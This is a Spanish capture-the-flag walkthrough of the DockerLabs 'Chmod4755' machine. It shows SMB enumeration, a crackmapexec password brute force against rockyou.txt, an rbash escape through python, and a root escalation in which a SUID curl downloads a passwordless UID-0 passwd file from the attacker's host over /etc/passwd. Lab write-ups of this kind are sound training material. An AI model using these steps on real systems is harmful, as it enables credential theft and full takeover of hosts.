#MAQUINA #DOCKERLABS #MEDIO 
#ENUM4LINUX #CRACKMAPEXEC #SMBMAP 
#SMBCLIENT 

<hr>

# RECONOCIMIENTO

Vamos a resolver **Chmod4755** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 12:38 CET
Initiating ARP Ping Scan at 12:38
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 12:38, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:38
Scanning 172.17.0.2 [65535 ports]
Discovered open port 445/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 139/tcp on 172.17.0.2
Completed SYN Stealth Scan at 12:38, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-17 12:38:04 CET for 0s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto  el puerto **22(SSH)** , **139 y 445** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,139,445 172.17.0.2              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 12:38 CET
Nmap scan report for 172.17.0.2
Host is up (0.000017s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a8:62:07:af:8e:77:13:6d:25:0a:2f:43:63:de:38:38 (ECDSA)
|_  256 93:93:a8:35:0e:fa:3e:05:04:27:70:2e:fc:22:e8:99 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-03-17T11:39:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.44 seconds


```

   ```bash

enum4linux 172.17.0.2
 ========================================( Users on 172.17.0.2 )========================================
                                                                                                                                                                                          
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smbuser  Name: smbuser   Desc:                                                                                                             

user:[smbuser] rid:[0x3e8]




```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.

## SMB (445)

Con enum4linux sacamos un usuario -> **smbuser**. Vamos a ver su contra :
```bash
crackmapexec smb 172.17.0.2 -u smbuser -p /usr/share/wordlists/rockyou.txt
SMB         172.17.0.2      445    4B7BFD5AC784     [+] 4B7BFD5AC784\smbuser:fuckit
```

Vamos a ver que podemos ver gracias a **smbmap**:

```bash
smbmap -H 172.17.0.2 -u smbuser -p fuckit                         

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        share_secret_only                                       READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (4b7bfd5ac784 server (Samba, Ubuntu))
[*] Closed 1 connections
```
# EXPLOTACION

Usamos smbclient para conectarnos :
```bash
smbclient //172.17.0.2/share_secret_only -U smbuser
Password for [WORKGROUP\smbuser]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Sep  2 14:05:05 2024
  ..                                  D        0  Mon Sep  2 14:05:05 2024
  note.txt                            N       13  Mon Sep  2 14:05:05 2024

                229727556 blocks of size 1024. 190597460 blocks available
smb: \> get note.txt 
getting file \note.txt of size 13 as note.txt (130000.0 KiloBytes/sec) (average inf KiloBytes/sec)
```

Tenemos una nota.

```bash
cat note.txt                 

read better

```

Tras un rato, me fijo en que había un segundo usuario -> **rabol** que me devolvía el enum4linux.

Su contra es el nombre del directorio.

YA ESTAMOS COMO RABOL.

# ESCALADA PRIVILEGIOS

Nos encontramos ante una rbash, donde solo podemos usar python y ls.

Nos otorgamos una bash normal (sin restricciones):
```bash
python3 -c 'import os; os.system("/bin/bash")'

```

Seguimos sin poder ejecutar los archivos bien :
```bash
export PATH=/bin
```

Vemos archivos con permisos SUID :
```bash
rabol@4b7bfd5ac784:/$ find / -perm -4000 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/curl
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Modificamos el passwd, añadiendo un nuevo usuario con el directorio personal de root y sin necesidad de usar contra :

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
rabol:x:1001:1001:rabol,,,:/home/rabol:/bin/rbash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
smbuser:x:1000:1000:smbuser,,,:/home/smbuser:/bin/bash
newroot::0:0:newroot:/root:/bin/bash
```

Usamos curl :
```bash
rabol@4b7bfd5ac784:/tmp$ curl http://172.17.0.1:8000/newShadow -o /etc/passwd
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1292  100  1292    0     0  1711k      0 --:--:-- --:--:-- --:--:-- 1261k
rabol@4b7bfd5ac784:/tmp$ su newroot
root@4b7bfd5ac784:/tmp# whoami
root
root@4b7bfd5ac784:/tmp# 
```

**YA ESTAMOS COMO ROOT.**